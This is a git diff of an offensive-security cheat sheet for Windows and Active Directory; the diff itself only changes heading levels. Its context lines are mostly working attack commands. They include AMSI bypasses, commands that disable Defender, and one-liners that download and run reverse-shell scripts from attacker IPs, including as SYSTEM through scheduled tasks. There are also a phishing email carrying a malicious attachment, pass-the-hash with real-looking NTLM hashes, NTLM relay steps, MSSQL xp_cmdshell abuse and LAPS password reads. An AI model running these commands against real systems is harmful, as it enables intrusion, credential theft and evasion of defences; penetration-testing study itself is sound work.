@@ -44,7 +44,7 @@ If you are in 32bit process, run: `%windir%\sysnative\WindowsPowerShell\v1.0\pow
 Finally you should see an agent connected to your ligolo server.
 
 
-# Map The Network
+## Map The Network
 - `nxc smb 172.16.125.0/24 --log hosts.txt` (for windows hosts)
 
 - `nxc ssh 172.16.125.0/24 --log hosts.txt` (for linux hosts)
@@ -54,11 +54,11 @@ Automation for `/etc/hosts` file:
 netexec smb 172.16.149.0/24 --log hosts.txt && sed -i 's/x64//g' hosts.txt && cat hosts.txt | awk '{print $9,$11,$11"."$21}' | sed 's/(domain://g' | sed 's/)//g' | uniq | sort -u | tr '[:upper:]' '[:lower:]' | sudo tee -a /etc/hosts
 ```
 
-# Windows Privilege Escalation
+## Windows Privilege Escalation
 - [PrivescCheck](https://raw.githubusercontent.com/itm4n/PrivescCheck/refs/heads/master/PrivescCheck.ps1): `Invoke-PrivescCheck -Report PrivescCheck_$($env:COMPUTERNAME) -Format HTML`
 - [winPEAS](https://raw.githubusercontent.com/peass-ng/PEASS-ng/refs/heads/master/winPEAS/winPEASps1/winPEAS.ps1): `iex(iwr http://192.168.45.196/winPEAS.ps1 -useb)`
 
-# AMSI-Bypass
+## AMSI-Bypass
 
 - Windows 10/11:
 ```
@@ -75,7 +75,7 @@ $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c
 (([Ref].Assembly.gettypes() | ? {$_.Name -like "Amsi*utils"}).GetFields("NonPublic,Static") | ? {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)
 ```
 
-# Windows Defender and Firewall Commands
+## Windows Defender and Firewall Commands
 
 | Description                                        | Command                                                                               |
 | -------------------------------------------------- | ------------------------------------------------------------------------------------- |
@@ -91,7 +91,7 @@ $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c
 | Remove all definitions                             | cmd.exe /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -removedefinitions -all |
 
 
-# Useful Basic Commands
+## Useful Basic Commands
 
 ### Run command as another user:
 - `Invoke-RunasCs amit 'Password123!' 'powershell iex(iwr http://192.168.45.185/rev.txt -usebasicparsing)' -ForceProfile -CreateProcessFunction 2 -BypassUac`
@@ -113,7 +113,7 @@ $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c
 ### Send email with attachment (Phishing)
 - `swaks --to jobs@cowmotors-int.com --from amit@rocks.com --header "Subject: My CV" --body "Attached my CV to this mail, thank you!" --attach @rev.doc --server 192.168.157.201`
 
-# Enumeration
+## Enumeration
 
 Search for SSH keys in Users directory:
 - `Get-ChildItem -Path C:\Users -Include .ssh -Directory -Recurse -ErrorAction SilentlyContinue | ForEach-Object { Get-ChildItem -Path $_.FullName -File -Recurse -ErrorAction SilentlyContinue }`
@@ -127,7 +127,7 @@ Powershell History Path:
 Sticky Notes Path:
 - `C:\Users\*\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\`
 
-# Enable RDP and RestrictedAdmin
+## Enable RDP and RestrictedAdmin
 *Note: Enabling RestrictedAdmin allow us to perform PassTheHash with RDP.*
 
 Using command prompt (Local): 
@@ -154,7 +154,7 @@ NTLM Auth:
 - `atexec.py test.local/john:password123@10.10.10.1 whoami'`
 - `atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 test.local/john@10.10.10.1 whoami`
 
-# Escalate to SYSTEM via Schedule Task
+## Escalate to SYSTEM via Schedule Task
 - `schtasks /create /tn "SystemTask" /tr "powershell iex(iwr http://192.168.45.223/hollow.ps1 -useb)" /sc once /st 00:00 /ru SYSTEM`
 
 - `schtasks /run /tn "SystemTask"`
@@ -165,7 +165,7 @@ NTLM Auth:
 - `set SESSION <Session Number>`
 - `run`
 
-# TCP Port Redirection via powercat
+## TCP Port Redirection via powercat
 
 Mostly be used for NTLM Relay attacks when the authentication cannot reach our attacking machine, so the idea is to redirect it from a random host in the network (where we have admin privileges) to our attacking machine.
 
@@ -199,7 +199,7 @@ Once it's running we can check if the victim is listening on port 445: `netstat 
 
 Last step is to perform the Relay - !REMEMEBER! not to our attacking box, but to the victim machine! and see the callback to our machine on port 445 tunneled from the victim!
 
-# MSSQL Useful Queries
+## MSSQL Useful Queries
 *Note: privileges in a database might differ, check every access you can accomplish, which mean using the local administrator, machine account, etc.*
 
 Injection POC - time delay:
@@ -229,7 +229,7 @@ exec ('EXEC sp_configure ''xp_cmdshell'',1 RECONFIGURE') at SQL03
 EXEC('xp_cmdshell ''powershell whoami''') AT SQL03;
 ```
 
-# MSSQLPwner
+## MSSQLPwner
 Enumerate MSSQL instance:
 - `mssqlpwner -hashes ':d38a856d6126f47a58ebfa34a4b70fef' 'WEB01$'@db01 -windows-auth enumerate`
 
@@ -248,7 +248,7 @@ Execute command through custom assembly:
 Retrieving password from the linked server:
 - `mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 retrieve-password`
 
-# PowerUPSQL
+## PowerUPSQL
 
 | Purpose | Command |
 |---------|---------|
@@ -266,7 +266,7 @@ Retrieving password from the linked server:
 | Escalate to sysadmin | Invoke-SQLEscalatePriv -Verbose -Instance SQLServer1 |
 | Execute xp_dirtree | sqlcmd -Q "xp_dirtree '\\\\10.10.14.51\\test'" |
 
-# NTLM Relay:
+## NTLM Relay:
 *Notes: three tools involved: Responder,ntlmrelayx and mssqlpwner/impacket, also, make sure the user authenticating to us have local admin access to the desired target*
 
 Prepare BASE64 command to execute:
@@ -350,7 +350,7 @@ impacket:
 - `Get-NetForestDomain -Forest eurocorp.local -Verbose | Get-NetDomainTrust` - Enumerate trusts for a trusting domain.
 - `Get-NetGPOGroup` -  Get GPO's which use Restricted Groups or groups.xml for interesting users.
 
-# TGS Abuse
+## TGS Abuse
 
 |     Service Type          |   Service Silver Tickets |
 | ------------------------- | ------------------------ |
@@ -362,7 +362,7 @@ impacket:
 | Golden Tickets            | krbtgt                   |
 | LDAP operations, included DCSync | LDAP              |
 
-# BloodyAD Cheetsheet
+## BloodyAD Cheetsheet
 
 | **Purpose**                                           | **Command**                                                                                                                              |
 |-------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|
@@ -377,7 +377,7 @@ impacket:
 | Read LAPS Password                                    | bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime |
 | Read LAPS Password (Kerberos Auth)                    | KRB5CCNAME=ted.ccache bloodyAD -k --dc-ip "192.168.202.120" --host dc03.infinity.com -d "infinity.com" get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime |
 
-# MSFVenom Payload Generation Cheetsheet
+## MSFVenom Payload Generation Cheetsheet
 
 | Name                            | Payload                                                                                                                                                                                                                        |
 | ------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
